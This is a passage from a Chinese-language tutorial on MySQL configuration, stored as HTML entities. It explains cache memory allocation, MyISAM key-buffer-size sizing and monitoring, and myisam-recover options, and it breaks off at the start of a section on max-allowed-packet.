&#x5B9E;&#x4F8B;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x8FDB;&#x7A0B; ID &#x5199;&#x5165;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#x2014;&#x2014;&#x8BE5;&#x6587;&#x4EF6;&#x5373;&#x4E3A; pid &#x6587;&#x4EF6;&#x3002;&#x8BE5;&#x6587;&#x4EF6;&#x53EF;&#x7531;&#x53C2;&#x6570;pid-file&#x63A7;&#x5236;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F4D;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x6587;&#x4EF6;&#x540D;&#x4E3A;&#x4E3B;&#x673A;&#x540D;.pid&#x3002;</p></blockquote><h4 id="DATA-STORAGE"><a href="#DATA-STORAGE" class="headerlink" title="DATA STORAGE"></a>DATA STORAGE</h4><p>datadir&#x7528;&#x4E8E;&#x914D;&#x7F6E;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#xFF0C;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x597D;&#x8BF4;&#x7684;&#x3002;</p><p><strong>&#x4E3A;&#x7F13;&#x5B58;&#x5206;&#x914D;&#x5185;&#x5B58;</strong><br>&#x63A5;&#x4E0B;&#x6765;&#x6709;&#x8BB8;&#x591A;&#x6D89;&#x53CA;&#x5230;&#x7F13;&#x5B58;&#x7684;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x7F13;&#x5B58;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x56E0;&#x7D20;&#x80AF;&#x5B9A;&#x662F;&#x670D;&#x52A1;&#x5668;&#x5185;&#x5B58;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x53EA;&#x8FD0;&#x884C; MySQL&#xFF0C;&#x6240;&#x6709;&#x4E0D;&#x9700;&#x8981;&#x4E3A; OS &#x4EE5;&#x53CA;&#x67E5;&#x8BE2;&#x5904;&#x7406;&#x4FDD;&#x7559;&#x7684;&#x5185;&#x5B58;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x5728; MySQL &#x7F13;&#x5B58;&#x3002;&#x4E3A; MySQL &#x7F13;&#x5B58;&#x5206;&#x914D;&#x66F4;&#x591A;&#x5185;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x7684;&#x907F;&#x514D;&#x78C1;&#x76D8;&#x8BBF;&#x95EE;&#xFF0C;&#x63D0;&#x5347;&#x6570;&#x636E;&#x5E93;&#x6027;&#x80FD;&#x3002;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x6765;&#x8BF4;&#x6700;&#x4E3A;&#x91CD;&#x8981;&#x7684;&#x7F13;&#x5B58;&#xFF1A;</p><ul><li>InnoDB &#x7F13;&#x51B2;&#x6C60;</li><li>InnoDB &#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C; MyISAM &#x6570;&#x636E;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7F13;&#x5B58; (MyISAM &#x4F9D;&#x8D56;&#x4E8E; OS &#x7F13;&#x5B58;&#x6570;&#x636E;)</li><li>MyISAM &#x952E;&#x7F13;&#x5B58;</li><li>&#x67E5;&#x8BE2;&#x7F13;&#x5B58;</li><li>&#x65E0;&#x6CD5;&#x914D;&#x7F6E;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;bin-log &#x6216;&#x8005;&#x8868;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;&#x7684; OS &#x7F13;&#x5B58;</li></ul><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7F13;&#x5B58;&#xFF0C;&#x4F46;&#x5B83;&#x4EEC;&#x901A;&#x5E38;&#x4E0D;&#x4F1A;&#x4F7F;&#x7528;&#x592A;&#x591A;&#x5185;&#x5B58;&#x3002;&#x5173;&#x4E8E;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x524D;&#x9762;&#x6587;&#x7AE0; (&#x53C2;&#x8003;&#x672C;&#x7CFB;&#x5217;&#x7684;&#x7B2C;&#x4E00;&#x7BC7;) &#x5DF2;&#x6709;&#x4ECB;&#x7ECD;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x6211;&#x4EEC;&#x4E0D;&#x5EFA;&#x8BAE;&#x5F00;&#x542F;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x56E0;&#x6B64;&#x4E0A;&#x6587;&#x7684;&#x914D;&#x7F6E;&#x4E2D;query-cache-type=0&#x8868;&#x793A;&#x7981;&#x7528;&#x4E86;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x5927;&#x5C0F;query-cache-size=0&#x3002;&#x9664;&#x5F00;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x5269;&#x4E0B;&#x5173;&#x4E8E; InnoDB &#x548C; MyISAM &#x7684;&#x76F8;&#x5173;&#x7F13;&#x5B58;&#xFF0C;&#x5728;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x505A;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x3002;</p><p>&#x5982;&#x679C;&#x53EA;&#x4F7F;&#x7528;&#x5355;&#x4E00;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x5668;&#x5C31;&#x4F1A;&#x7B80;&#x5355;&#x8BB8;&#x591A;&#x3002;&#x5982;&#x679C;&#x53EA;&#x4F7F;&#x7528; MyISAM &#x8868;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x5173;&#x95ED; InnoDB&#xFF0C;&#x800C;&#x5982;&#x679C;&#x53EA;&#x4F7F;&#x7528; InnoDB&#xFF0C;&#x5C31;&#x53EA;&#x9700;&#x8981;&#x5206;&#x914D;&#x6700;&#x5C11;&#x7684;&#x8D44;&#x6E90;&#x7ED9; MyISAM&#xFF08;MySQL &#x5185;&#x90E8;&#x7CFB;&#x7EDF;&#x8868;&#x4F7F;&#x7528; MyISAM &#x5F15;&#x64CE;&#xFF09;&#x3002;&#x4F46;&#x5982;&#x679C;&#x662F;&#x6DF7;&#x5408;&#x4F7F;&#x7528;&#x5404;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x5C31;&#x5F88;&#x96BE;&#x5728;&#x4ED6;&#x4EEC;&#x4E4B;&#x95F4;&#x627E;&#x5230;&#x6070;&#x5F53;&#x7684;&#x5E73;&#x8861;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x80FD;&#x6839;&#x636E;&#x4E1A;&#x52A1;&#x505A;&#x4E00;&#x4E2A;&#x731C;&#x6D4B;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x8FD0;&#x884C;&#x4E2D;&#x89C2;&#x5BDF;&#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x72B6;&#x51B5;&#x540E;&#x505A;&#x51FA;&#x8C03;&#x6574;&#x3002;</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p><strong>key-buffer-size</strong></p><p><code>key-buffer-size</code>&#x7528;&#x4E8E;&#x914D;&#x7F6E; <code>MyISAM</code>&#x952E;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x952E;&#x7F13;&#x5B58;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x3002;MyISAM &#x81EA;&#x8EAB;&#x53EA;&#x7F13;&#x5B58;&#x7D22;&#x5F15;&#xFF0C;&#x4E0D;&#x7F13;&#x5B58;&#x6570;&#x636E; (&#x4F9D;&#x8D56; OS &#x7F13;&#x5B58;&#x6570;&#x636E;)&#x3002;&#x5982;&#x679C;&#x5927;&#x90E8;&#x5206;&#x8868;&#x90FD;&#x662F; <code>MyISAM</code>&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x4E3A;&#x952E;&#x7F13;&#x5B58;&#x8BBE;&#x7F6E;&#x8F83;&#x591A;&#x7684;&#x5185;&#x5B58;&#x3002;&#x4F46;&#x5982;&#x4F55;&#x786E;&#x5B9A;&#x8BE5;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#xFF1F;<br>&#x5047;&#x8BBE;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x5927;&#x5C0F;&#x4E3A; X&#xFF0C;&#x80AF;&#x5B9A;&#x4E0D;&#x9700;&#x8981;&#x628A;&#x7F13;&#x5B58;&#x8BBE;&#x7F6E;&#x5F97;&#x6BD4; X &#x8FD8;&#x5927;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x524D;&#x7684;&#x7D22;&#x5F15;&#x5927;&#x5C0F;&#x5C31;&#x6210;&#x4E3A;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x7684;&#x91CD;&#x8981;&#x4F9D;&#x636E;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x67E5;&#x8BE2;&#x5F53;&#x524D;&#x7D22;&#x5F15;&#x7684;&#x5927;&#x5C0F;&#xFF1A;</p><p>1.&#x901A;&#x8FC7; SQL &#x8BED;&#x53E5;&#x67E5;&#x8BE2;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(INDEX_LENGTH) FROM INFORMATION_SCHEMA.TABLES WHERE ENGINE = <span class="string">&apos;MYISAM&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2.&#x7EDF;&#x8BA1;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ du -sch `find /path/to/mysql/data/directory/ -name <span class="string">&quot;*.MYI&quot;</span>`</span><br><span class="line">&#x6BD4;&#x5982;&#xFF1A;</span><br><span class="line">root@dev-msc3:<span class="comment"># du -sch `find /var/lib/mysql -name &quot;*.MYI&quot;`</span></span><br><span class="line">72K        /var/lib/mysql/static/t_global_region.MYI</span><br><span class="line">40K        /var/lib/mysql/mysql/db.MYI</span><br><span class="line">12K        /var/lib/mysql/mysql/proxies_priv.MYI</span><br><span class="line">12K        /var/lib/mysql/mysql/tables_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/func.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/columns_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/proc.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/event.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/user.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/procs_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/ndb_binlog_index.MYI</span><br><span class="line">164K       total</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F60;&#x53EF;&#x80FD;&#x4F1A;&#x95EE;&#xFF0C;&#x521A;&#x521B;&#x5EFA;&#x597D;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x6CA1;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#xFF0C;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x4E3A; 0&#xFF0C;&#x90A3;&#x5982;&#x4F55;&#x914D;&#x7F6E;&#x952E;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#xFF1F;&#x8FD9;&#x65F6;&#x5019;&#x53EA;&#x80FD;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#x503C;&#xFF1A;&#x4E0D;&#x8D85;&#x8FC7;&#x4E3A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7F13;&#x5B58;&#x4FDD;&#x7559;&#x5185;&#x5B58;&#x7684; 25% ~ 50%&#x3002;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x57FA;&#x672C;&#x503C;&#xFF0C;&#x7B49;&#x8FD0;&#x884C;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x540E;&#xFF0C;&#x6839;&#x636E;&#x8FD0;&#x884C;&#x60C5;&#x51B5;&#x6765;&#x8C03;&#x6574;&#x952E;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#x3002;&#x603B;&#x7ED3;&#x6765;&#x8BF4;&#xFF0C;&#x7D22;&#x5F15;&#x5927;&#x5C0F;&#x4E0E; OS &#x7F13;&#x5B58;&#x7684; 25%~50% &#x4E24;&#x8005;&#x95F4;&#x53D6;&#x5C0F;&#x8005;&#x3002;&#x5F53;&#x7136;&#x8FD8;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x952E;&#x7F13;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x540E;&#x8FD8;&#x662F;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x5B8C;&#x6240;&#x6709;&#x7684;&#x952E;&#x7F13;&#x5B58;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x628A;&#x7F13;&#x51B2;&#x533A;&#x8C03;&#x5C0F;&#x4E00;&#x70B9;&#xFF0C;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x533A;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x516C;&#x5F0F;&#xFF1A;<br><strong>(key_blocks_unused * key_cache_block_size) / key_buffer_size</strong></p><blockquote><p>&#x8BF4;&#x660E;&#xFF1A;</p></blockquote><blockquote><p>key_blocks_unused &#x7684;&#x503C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; SHOW STATUS &#x83B7;&#x53D6;</p></blockquote><blockquote><p>key_cache_block_size &#x7684;&#x503C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; SHOW VARIABLES &#x83B7;&#x53D6;</p></blockquote><p>&#x952E;&#x7F13;&#x5B58;&#x5757;&#x5927;&#x5C0F;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x5F71;&#x54CD; MyISAM&#x3001;OS &#x7F13;&#x5B58;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x7684;&#x4EA4;&#x4E92;&#x3002;&#x5982;&#x679C;&#x7F13;&#x5B58;&#x5757;&#x592A;&#x5C0F;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x78B0;&#x5230;&#x5199;&#x65F6;&#x8BFB;&#x53D6; (OS &#x5728;&#x5199;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x5148;&#x4ECE;&#x78C1;&#x76D8;&#x4E0A;&#x8BFB;&#x53D6;&#x4E00;&#x4E9B;&#x6570;&#x636E;)&#xFF0C;&#x5173;&#x4E8E;&#x5199;&#x65F6;&#x8BFB;&#x53D6;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x67E5;&#x9605;&#x3002;</p><p>&#x5173;&#x4E8E;&#x7F13;&#x5B58;&#x547D;&#x4E2D;&#x7387;&#xFF0C;&#x8FD9;&#x91CC;&#x518D;&#x8BF4;&#x4E00;&#x70B9;&#x3002;&#x7F13;&#x5B58;&#x547D;&#x4E2D;&#x7387;&#x6709;&#x4EC0;&#x4E48;&#x610F;&#x4E49;&#xFF1F;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x6CA1;&#x592A;&#x5927;&#x7684;&#x4F5C;&#x7528;&#x3002;&#x6BD4;&#x5982; 99% &#x548C; 99.9% &#x4E4B;&#x95F4;&#x770B;&#x8D77;&#x6765;&#x5DEE;&#x8DDD;&#x5F88;&#x5C0F;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x4EE3;&#x8868;&#x4E86; 10 &#x500D;&#x7684;&#x5DEE;&#x8DDD;&#x3002;&#x7F13;&#x5B58;&#x547D;&#x4E2D;&#x7387;&#x7684;&#x5B9E;&#x9645;&#x610F;&#x4E49;&#x4E0E;&#x5E94;&#x7528;&#x4E5F;&#x6709;&#x5F88;&#x5927;&#x5173;&#x7CFB;&#xFF0C;&#x6709;&#x4E9B;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x5728;&#x547D;&#x4E2D;&#x7387; 99% &#x4E0B;&#x826F;&#x597D;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x6709;&#x4E9B; I/O &#x5BC6;&#x96C6;&#x578B;&#x5E94;&#x7528;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981; 99.99%&#x3002;&#x6240;&#x4EE5;&#x4ECE;&#x7ECF;&#x9A8C;&#x4E0A;&#x6765;&#x8BF4;&#xFF0C;&#x6BCF;&#x79D2;&#x672A;&#x547D;&#x4E2D;&#x6B21;&#x6570;&#x8FD9;&#x4E2A;&#x6307;&#x6807;&#x5B9E;&#x9645;&#x4E0A;&#x4F1A;&#x66F4;&#x6709;&#x7528;&#x4E00;&#x4E9B;&#x3002;&#x6BD4;&#x5982;&#x6BCF;&#x79D2; 5 &#x6B21;&#x672A;&#x547D;&#x4E2D;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4; IO &#x7E41;&#x5FD9;&#xFF0C;&#x4F46;&#x6BCF;&#x79D2; 100 &#x6B21;&#x7F13;&#x5B58;&#x672A;&#x547D;&#x4E2D;&#x5219;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x3002;</p><p>MyISAM &#x952E;&#x7F13;&#x5B58;&#x7684;&#x6BCF;&#x79D2;&#x672A;&#x547D;&#x4E2D;&#x6B21;&#x6570;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x76D1;&#x63A7;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x8BA1;&#x7B97;&#x6BCF;&#x9694;10s&#x7F13;&#x5B58;&#x672A;&#x547D;&#x4E2D;&#x6B21;&#x6570;&#x7684;&#x589E;&#x91CF;</span></span><br><span class="line"><span class="comment"># &#x4F7F;&#x7528;&#x6B64;&#x547D;&#x4EE4;&#x65F6;&#x8BF7;&#x5E26;&#x4E0A;&#x7528;&#x6237;&#x548C;&#x5BC6;&#x7801;&#x53C2;&#x6570;&#xFF1A;mysqladmin -uroot -pxxx extended-status -r -i 10 | grep Key_reads</span></span><br><span class="line">$ mysqladmin extended-status -r -i 10 | grep Key_reads</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x540E;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x4EFB;&#x4F55; MyISAM &#x8868;&#xFF0C;&#x4F9D;&#x7136;&#x9700;&#x8981;&#x5C06;key-buffer-size&#x8BBE;&#x7F6E;&#x4E3A;&#x8F83;&#x5C0F;&#x503C;&#xFF0C;&#x6BD4;&#x5982; 32M&#xFF0C;&#x56E0;&#x4E3A; MySQL &#x5185;&#x90E8;&#x4F1A;&#x4F7F;&#x7528; MyISAM &#x8868;&#xFF0C;&#x6BD4;&#x5982; GROUP BY &#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x4F1A;&#x521B;&#x5EFA; MyISAM &#x4E34;&#x65F6;&#x8868;&#x3002;</p><h4 id="myisam-recover"><a href="#myisam-recover" class="headerlink" title="myisam-recover"></a>myisam-recover</h4><p>myisam-recover&#x9009;&#x9879;&#x7528;&#x4E8E;&#x914D;&#x7F6E; MyISAM &#x600E;&#x6837;&#x5BFB;&#x627E;&#x548C;&#x4FEE;&#x590D;&#x9519;&#x8BEF;&#x3002;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x4F1A;&#x901A;&#x77E5; MySQL &#x5728;&#x6253;&#x5F00;&#x8868;&#x65F6;&#xFF0C;&#x68C0;&#x67E5;&#x8868;&#x662F;&#x5426;&#x635F;&#x574F;&#xFF0C;&#x5E76;&#x5728;&#x627E;&#x5230;&#x95EE;&#x9898;&#x65F6;&#x8FDB;&#x884C;&#x4FEE;&#x590D;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x5982;&#x4E0B;&#x503C;&#xFF1A;    </p><ul><li>DEFAULT&#xFF1A;&#x8868;&#x793A;&#x4E0D;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F1A;&#x5C1D;&#x8BD5;&#x4FEE;&#x590D;&#x5D29;&#x6E83;&#x6216;&#x8005;&#x672A;&#x5B8C;&#x5168;&#x5173;&#x95ED;&#x7684;&#x8868;&#xFF0C;&#x4F46;&#x5728;&#x6062;&#x590D;&#x6570;&#x636E;&#x65F6;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x5176;&#x5B83;&#x52A8;&#x4F5C;</li><li>BACKUP&#xFF1A;&#x5C06;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x5230;. bak &#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x4FBF;&#x968F;&#x540E;&#x8FDB;&#x884C;&#x68C0;&#x67E5;</li><li>FORCE&#xFF1A;&#x5373;&#x4F7F;. myd &#x6587;&#x4EF6;&#x4E2D;&#x4E22;&#x5931;&#x7684;&#x6570;&#x636E;&#x8D85;&#x8FC7; 1 &#x884C;&#xFF0C;&#x4E5F;&#x8BA9;&#x6062;&#x590D;&#x52A8;&#x4F5C;&#x7EE7;&#x7EED;&#x6267;&#x884C;</li><li>QUICK&#xFF1A;&#x9664;&#x975E;&#x6709;&#x5220;&#x9664;&#x5757;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x8FC7;&#x6062;&#x590D;</li></ul><p>&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x503C;&#xFF0C;&#x6BCF;&#x4E2A;&#x503C;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#xFF0C;&#x6BD4;&#x5982;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;BACKUP,FORCE&#x4F1A;&#x5F3A;&#x5236;&#x6062;&#x590D;&#x5E76;&#x4E14;&#x521B;&#x5EFA;&#x5907;&#x4EFD;&#xFF0C;&#x8FD9;&#x6837;&#x914D;&#x7F6E;&#x5728;&#x53EA;&#x6709;&#x4E00;&#x4E9B;&#x5C0F;&#x7684; MyISAM &#x8868;&#x65F6;&#x6709;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x7740;&#x4E00;&#x4E9B;&#x635F;&#x574F;&#x7684; MyISAM &#x8868;&#x662F;&#x975E;&#x5E38;&#x5371;&#x9669;&#x7684;&#xFF0C;&#x5B83;&#x4EEC;&#x6709;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x66F4;&#x591A;&#x6570;&#x636E;&#x635F;&#x574F;&#xFF0C;&#x751A;&#x81F3;&#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#x3002;&#x7136;&#x800C;&#x5982;&#x679C;&#x6709;&#x5F88;&#x5927;&#x7684;&#x8868;&#xFF0C;&#x5B83;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6253;&#x5F00;&#x6240;&#x6709;&#x7684; MyISAM &#x8868;&#x65F6;&#x90FD;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;&#xFF0C;&#x5927;&#x8868;&#x7684;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;&#x53EF;&#x80FD;&#x4F1A;&#x8017;&#x8D39;&#x5927;&#x91CF;&#x65F6;&#x95F4;&#xFF0C;&#x4E14;&#x5728;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x91CC;&#xFF0C;MySQL &#x4F1A;&#x963B;&#x6B62;&#x8FD9;&#x4E2A;&#x8FDE;&#x63A5;&#x505A;&#x5176;&#x5B83;&#x4EFB;&#x4F55;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x663E;&#x7136;&#x662F;&#x4E0D;&#x5207;&#x5B9E;&#x9645;&#x7684;&#x3002;</p><p>&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528; InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53EA;&#x6709;&#x975E;&#x5E38;&#x5C0F;&#x7684; MyISAM &#x8868;&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x914D;&#x7F6E;key-buffe-size&#x4E8E;&#x4E00;&#x4E2A;&#x5F88;&#x5C0F;&#x7684;&#x503C; (32M) &#x4EE5;&#x53CA;myisam-recover=BACKUP,FORCE&#x3002;&#x5F53;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x8868;&#x4E3A; MyISAM &#x8868;&#x65F6;&#xFF0C;&#x8BF7;&#x6839;&#x636E;&#x4E0A;&#x6587;&#x7684;&#x516C;&#x5F0F;&#x5408;&#x7406;&#x914D;&#x7F6E;key-buffer-size&#xFF0C;&#x800C;myisam-recover&#x5219;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#xFF0C;&#x5728;&#x542F;&#x52A8;&#x540E;&#x4F7F;&#x7528;CHECK TABLES&#x548C;REPAIR TABLES&#x547D;&#x4EE4;&#x6765;&#x505A;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;&#xFF0C;&#x8FD9;&#x6837;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5F71;&#x54CD;&#x6BD4;&#x8F83;&#x5C0F;&#x3002;</p><h4 id="SAFETY"><a href="#SAFETY" class="headerlink" title="SAFETY"></a>SAFETY</h4><p>&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x5230;&#x4F4D;&#x540E;&#xFF0C;MySQL &#x5DF2;&#x7ECF;&#x6BD4;&#x8F83;&#x5B89;&#x5168;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x4EC5;&#x4EC5;&#x5217;&#x51FA;&#x4E24;&#x4E2A;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x542F;&#x7528;&#x4E00;&#x4E9B;&#x4F7F;&#x670D;&#x52A1;&#x5668;&#x66F4;&#x5B89;&#x5168;&#x548C;&#x53EF;&#x9760;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; MySQL &#x5B98;&#x65B9;&#x624B;&#x518C;&#xFF0C;&#x4F46;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5B83;&#x4EEC;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x9009;&#x9879;&#x53EF;&#x80FD;&#x4F1A;&#x5F71;&#x54CD;&#x6027;&#x80FD;&#xFF0C;&#x6BD5;&#x7ADF;&#x4FDD;&#x8BC1;&#x5B89;&#x5168;&#x548C;&#x53EF;&#x9760;&#x9700;&#x8981;&#x4ED8;&#x51FA;&#x4E00;&#x4E9B;&#x4EE3;&#x4EF7;&#x3002;</p><p><strong>max-allowed-packet</strong><br><code>max-allowed-packet</code>&#x9632;&#x6B62;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x592A;&#x5927;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4E5F;&#x63A7;&#x5236;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x63A5;&#x6536;&#x591A;&#x5927;&#x7684;&#x5305;&#x3002;&#x9ED8;&#x8BA4;&#x503C; 